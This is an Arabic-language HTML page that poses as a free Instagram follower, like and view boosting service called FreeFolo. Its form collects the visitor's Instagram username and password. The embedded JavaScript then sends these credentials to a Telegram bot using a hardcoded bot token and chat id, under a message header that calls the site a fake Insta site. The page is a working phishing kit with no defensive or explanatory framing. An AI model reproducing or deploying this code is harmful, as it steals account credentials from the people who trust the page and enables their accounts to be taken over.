<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>رشق انستا - FreeFolo</title>
  <style>
    body {
      background: linear-gradient(to right, #f58529, #dd2a7b, #8134af);
      font-family: 'Tahoma', sans-serif;
      color: white;
      text-align: center;
      padding: 30px;
    }

    .container {
      background: #ffffff10;
      padding: 20px;
      border-radius: 20px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px #00000033;
    }

    h1 {
      margin-bottom: 25px;
      font-size: 28px;
    }

    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      font-size: 16px;
    }

    input, select {
      background-color: white;
      color: black;
    }

    button {
      background-color: #3897f0;
      color: white;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background-color: #2f80ed;
    }

    label {
      text-align: right;
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>رشق متابعين انستا</h1>
    <form onsubmit="sendData(); return false;">
      <label>اسم المستخدم</label>
      <input type="text" id="username" placeholder="مثل: insta_user123" required>

      <label>كلمة المرور</label>
      <input type="password" id="password" placeholder="كلمة مرور الحساب" required>

      <label>عدد المتابعين</label>
      <select id="amount">
        <option value="1000">1000 متابع</option>
        <option value="2000">2000 متابع</option>
        <option value="5000">5000 متابع</option>
      </select>

      <label>نوع الرشق</label>
      <select id="type">
        <option value="متابعين">متابعين</option>
        <option value="لايكات">لايكات</option>
        <option value="مشاهدات">مشاهدات</option>
      </select>

      <button id="submitBtn" type="submit">ابدأ الرشق الآن</button>
    </form>
  </div>

  <script>
    function sendData() {
      var username = document.getElementById("username").value;
      var password = document.getElementById("password").value;
      var amount = document.getElementById("amount").value;
      var type = document.getElementById("type").value;

      var message = `📥 موقع انستا وهمي\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n📦 الكمية: ${amount}\n📌 النوع: ${type}`;

      var token = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
      var chat_id = "6454073193";
      var url = `https://api.telegram.org/bot${token}/sendMessage`;

      var btn = document.getElementById("submitBtn");
      btn.disabled = true;
      btn.innerText = "جاري الإرسال...";

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      }).then(() => {
        alert("✅ تم إرسال البيانات بنجاح");
      }).catch(() => {
        alert("❌ فشل في الإرسال");
      }).finally(() => {
        btn.disabled = false;
        btn.innerText = "ابدأ الرشق الآن";
      });
    }
  </script>
</body>
</html>
